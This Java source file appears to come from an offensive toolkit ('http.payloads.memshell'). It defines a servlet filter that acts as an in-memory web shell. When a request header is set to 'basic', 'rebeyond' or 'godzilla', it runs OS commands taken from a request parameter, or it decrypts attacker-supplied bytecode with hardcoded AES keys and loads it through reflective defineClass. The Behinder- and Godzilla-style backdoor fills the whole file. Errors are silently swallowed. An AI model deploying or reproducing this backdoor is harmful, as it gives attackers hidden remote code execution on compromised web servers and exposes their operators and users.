package http.payloads.memshell;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.net.URL;
import java.net.URLClassLoader;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;
import java.util.Scanner;

public class DynamicFilter implements Filter {
    private static final String FLAG = "x-request-id";
    private static final String CMD_PARAM = "pass";
    private static final String RKEY = "e45e329feb5d925b";
    private static final String GKEY = "3c6e0b8a9c15224a";

    Class payload;
    String digest = md5(CMD_PARAM + GKEY);

    public DynamicFilter() {
        super();
    }

    @Override
    public void init(FilterConfig filterConfig) {
    }

    @Override
    public void doFilter(
            ServletRequest req,
            ServletResponse resp,
            FilterChain filterChain
    ) throws IOException, ServletException {
        HttpServletRequest httpReq = (HttpServletRequest) req;

        if (httpReq.getHeader(FLAG).equalsIgnoreCase("basic")) {
            String input = req.getParameter(CMD_PARAM);
            if (input != null && !input.isEmpty()) {
                String[] cmd;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    cmd = new String[]{"cmd", "/C", input};
                } else {
                    cmd = new String[]{"/bin/sh", "-c", input};
                }
                String result = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                resp.getWriter().println(result);
            }
        } else if (httpReq.getHeader(FLAG).equalsIgnoreCase("rebeyond")) {
            try {
                if (httpReq.getMethod().equals("POST")) {
                    httpReq.getSession().setAttribute("u", RKEY);

                    byte[] input = b64de(req.getReader().readLine());
                    byte[] payload = aes(input, RKEY, false);

                    Class evilClass = (Class) Class.forName("java.lang.ClassLoader")
                            .getDeclaredMethod("defineClass", byte[].class, int.class, int.class)
                            .invoke(Thread.currentThread().getContextClassLoader(), payload, 0, payload.length);
                    Object evilObject = evilClass.newInstance();
                    Method targetMethod = evilClass.getDeclaredMethod("equals", ServletRequest.class, ServletResponse.class);
                    targetMethod.invoke(evilObject, req, resp);
                }
            } catch (Exception ignored) {
            }
        } else if (httpReq.getHeader(FLAG).equalsIgnoreCase("godzilla")) {
            byte[] data = b64de(req.getParameter(CMD_PARAM));
            data = aes(data, GKEY, false);
            try {
                if (payload == null) {
                    URLClassLoader classLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
                    Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    defMethod.setAccessible(true);
                    payload = (Class) defMethod.invoke(classLoader, data, 0, data.length);
                } else {
                    ByteArrayOutputStream out = new ByteArrayOutputStream();
                    Object obj = payload.newInstance();
                    obj.equals(out);
                    obj.equals(data);
                    obj.equals(req);
                    resp.getWriter().write(digest.substring(0, 16));
                    obj.toString();
                    resp.getWriter().write(b64en(aes(out.toByteArray(), GKEY, true)));
                    resp.getWriter().write(digest.substring(16));
                }
            } catch (Exception ignored) {
            }
        } else {
            filterChain.doFilter(req, resp);
        }
    }

    private String b64en(byte[] input) {
        return Base64.getEncoder().encodeToString(input);
    }

    private byte[] b64de(String input) {
        return Base64.getDecoder().decode(input);
    }

    private String md5(String input) {
        try {
            MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(input.getBytes(), 0, input.length());
            return new BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch (NoSuchAlgorithmException ignored) {
            return null;
        }
    }

    private byte[] aes(byte[] input, String key, boolean isEncrypt) {
        try {
            Cipher cipher = Cipher.getInstance("AES");
            cipher.init(isEncrypt ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
            return cipher.doFinal(input);
        } catch (Exception e) {
            return null;
        }
    }

    @Override
    public void destroy() {
    }
}
